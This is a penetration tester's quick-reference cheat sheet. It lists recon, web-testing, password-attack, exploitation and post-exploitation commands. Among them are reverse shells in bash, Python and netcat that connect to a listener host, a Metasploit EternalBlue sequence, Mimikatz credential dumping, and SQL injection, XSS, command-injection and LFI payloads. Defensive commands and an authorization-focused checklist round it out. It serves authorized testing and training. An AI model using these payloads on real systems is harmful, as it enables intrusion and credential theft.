# 🚀 HACKER PLAYBOOK - QUICK REFERENCE GUIDE

**Essential Commands & Tools for Rapid Access**

---

## 🎯 MOST USED COMMANDS

### Reconnaissance

```bash
# Network Discovery
nmap -sn 192.168.1.0/24                    # Ping sweep
nmap -p- -sV 192.168.1.100                # Full port scan with version detection
nmap -A 192.168.1.100                     # Aggressive scan (OS, version, scripts)

# Web Enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
nikto -h https://target.com
whatweb https://target.com

# DNS Enumeration
dig target.com ANY
dnsrecon -d target.com
sublist3r -d target.com

# OSINT
theHarvester -d target.com -b all
whois target.com
```

### Web Application Testing

```bash
# SQL Injection
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# XSS Testing
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Command Injection
; ls
| whoami
`cat /etc/passwd`
$(whoami)

# Directory Brute Force
ffuf -u https://target.com/FUZZ -w wordlist.txt
dirsearch -u https://target.com -e php,html,js
```

### Password Attacks

```bash
# Hash Cracking
hashcat -m 0 -a 0 hashes.txt rockyou.txt              # MD5
hashcat -m 1000 -a 0 hashes.txt rockyou.txt           # NTLM
john --wordlist=rockyou.txt hashes.txt

# Online Attacks
hydra -l admin -P passwords.txt ssh://192.168.1.100
hydra -L users.txt -P passwords.txt http-post-form "//login:username=^USER^&password=^PASS^:F=incorrect"
```

### Exploitation

```bash
# Metasploit
msfconsole
search exploit_name
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

# Reverse Shells
# Bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat
nc -e /bin/bash 10.0.0.1 4444
```

### Privilege Escalation

```bash
# Linux
sudo -l                                    # Check sudo permissions
find / -perm -4000 -type f 2>/dev/null    # Find SUID binaries
cat /etc/crontab                           # Check cron jobs
./linpeas.sh                               # Automated enumeration

# Windows
whoami /priv
systeminfo
net user
net localgroup administrators
.\winPEAS.exe
```

### Post-Exploitation

```bash
# Meterpreter
sysinfo
getuid
hashdump
screenshot
download c:\\file.txt
upload shell.exe c:\\windows\\temp\\
shell

# Active Directory
# Kerberoasting
Invoke-Kerberoast -OutputFormat HashCat

# Bloodhound
.\SharpHound.exe -c All

# Mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```

### Network Analysis

```bash
# Wireshark Filters
ip.addr == 192.168.1.1
tcp.port == 80
http.request.method == "POST"
dns

# tcpdump
tcpdump -i eth0 -w capture.pcap
tcpdump -r capture.pcap
tcpdump -i eth0 host 192.168.1.1
```

---

## 🛡️ DEFENSIVE COMMANDS

### Log Analysis

```bash
# Search logs for suspicious activity
grep -i "failed" /var/log/auth.log
grep -i "authentication failure" /var/log/secure
cat /var/log/apache2/access.log | grep "404"

# Windows Event Logs
wevtutil qe Security /f:text
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625}
```

### Incident Response

```bash
# Memory Dump
# Windows
winpmem.exe memory.raw

# Linux
dd if=/dev/mem of=memory.dd

# Volatility Analysis
volatility -f memory.dmp imageinfo
volatility -f memory.dmp --profile=Win7SP1x64 pslist
volatility -f memory.dmp --profile=Win7SP1x64 netscan
```

### Forensics

```bash
# Disk Imaging
dd if=/dev/sda of=disk.img bs=4M
dcfldd if=/dev/sda of=disk.img hash=md5,sha256

# File Analysis
exiftool file.pdf
strings suspicious.exe
file unknown_file
```

---

## 📱 ESSENTIAL TOOL QUICK LIST

### 🔍 Reconnaissance
- **Nmap** - Network scanner
- **Masscan** - Fast port scanner
- **theHarvester** - OSINT gathering
- **Maltego** - Link analysis
- **Shodan** - Internet device search

### 🌐 Web Testing
- **Burp Suite** - Web proxy/scanner
- **OWASP ZAP** - Web scanner
- **SQLMap** - SQL injection
- **Nikto** - Web server scanner
- **Gobuster** - Directory brute force

### 💥 Exploitation
- **Metasploit** - Exploitation framework
- **Empire** - Post-exploitation
- **Cobalt Strike** - Red team platform
- **BeEF** - Browser exploitation

### 🔐 Password Attacks
- **Hashcat** - GPU password cracking
- **John the Ripper** - Password cracker
- **Hydra** - Online brute force
- **CrackMapExec** - AD attacks

### 🎯 Active Directory
- **BloodHound** - AD visualization
- **Mimikatz** - Credential dumping
- **Rubeus** - Kerberos attacks
- **PowerView** - AD enumeration

### 🛡️ Defense & Monitoring
- **Splunk** - SIEM platform
- **ELK Stack** - Log management
- **Snort** - IDS/IPS
- **Wireshark** - Packet analysis
- **Volatility** - Memory forensics

### 🔬 Forensics
- **Autopsy** - Disk forensics
- **FTK Imager** - Forensic imaging
- **Volatility** - Memory analysis
- **NetworkMiner** - Network forensics

---

## 🎨 COMMON PAYLOADS

### SQL Injection
```sql
' OR '1'='1' --
' OR '1'='1' ({
admin'--
' UNION SELECT NULL,NULL,NULL--
' AND 1=2 UNION SELECT username,password FROM users--
```

### XSS
```javascript
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### Command Injection
```bash
; cat /etc/passwd
| whoami
& net user
&& dir
`id`
$(whoami)
```

### LFI/RFI
```
../../../etc/passwd
../../windows/system32/drivers/etc/hosts
php://filter/convert.base64-encode/resource=config.php
```

---

## 🔗 ESSENTIAL WORDLISTS

```bash
# SecLists (Most comprehensive)
/usr/share/seclists/

# Common locations
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Download SecLists
git clone https://github.com/danielmiessler/SecLists.git
```

---

## 🎓 QUICK METHODOLOGY CHECKLIST

### Penetration Test Phases

✅ **1. Pre-Engagement**
- [ ] Scope defined
- [ ] Authorization obtained
- [ ] Rules of engagement signed
- [ ] Emergency contacts established

✅ **2. Reconnaissance**
- [ ] Passive OSINT
- [ ] Active scanning
- [ ] Service enumeration
- [ ] Technology identification

✅ **3. Vulnerability Assessment**
- [ ] Automated scanning
- [ ] Manual testing
- [ ] Vulnerability validation
- [ ] Risk assessment

✅ **4. Exploitation**
- [ ] PoC development
- [ ] Safe exploitation
- [ ] Evidence collection
- [ ] Access verification

✅ **5. Post-Exploitation**
- [ ] Privilege escalation
- [ ] Lateral movement
- [ ] Data location
- [ ] Persistence (if authorized)

✅ **6. Reporting**
- [ ] Executive summary
- [ ] Technical findings
- [ ] Remediation steps
- [ ] Risk ratings

---

## 🚨 SEVERITY RATINGS

### CVSS Quick Reference

**Critical (9.0-10.0)**
- Remote code execution
- Authentication bypass
- Data breach potential

**High (7.0-8.9)**
- Privilege escalation
- SQL injection
- Significant data exposure

**Medium (4.0-6.9)**
- Information disclosure
- Cross-site scripting
- Configuration issues

**Low (0.1-3.9)**
- Minor information leak
- Best practice violations

---

## 📞 EMERGENCY CONTACTS TEMPLATE

```
CLIENT EMERGENCY CONTACT:
Name: __________________
Phone: __________________
Email: __________________

LAW ENFORCEMENT CONTACT:
Department: __________________
Contact: __________________
Phone: __________________

INCIDENT ESCALATION:
If systems become unstable:
1. STOP all testing immediately
2. Call emergency contact
3. Document what was done
4. Wait for authorization to continue
```

---

## 🔍 QUICK GOOGLE DORKS

```
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:sql
site:target.com inurl:php?id=
"target.com" intext:"sql syntax near"
site:target.com ext:log
site:target.com inurl:wp-content
```

---

## 💡 PRO TIPS

1. **Always get written authorization** before testing
2. **Document everything** - timestamps, commands, results
3. **Test in stages** - don't jump straight to exploitation
4. **Have a backup plan** - systems can break
5. **Communicate regularly** with the client
6. **Never test production** databases directly if avoidable
7. **Use VPNs/proxies** for attribution management
8. **Keep tools updated** - exploits and signatures change
9. **Practice on legal targets** - HackTheBox, TryHackMe, etc.
10. **Know when to stop** - if unsure, ask first

---

**Quick Reference Guide v2.0**  
**Part of: Hacker Playbook 2025 Collection**  
**Next: See Complete Tools Catalog for detailed documentation**

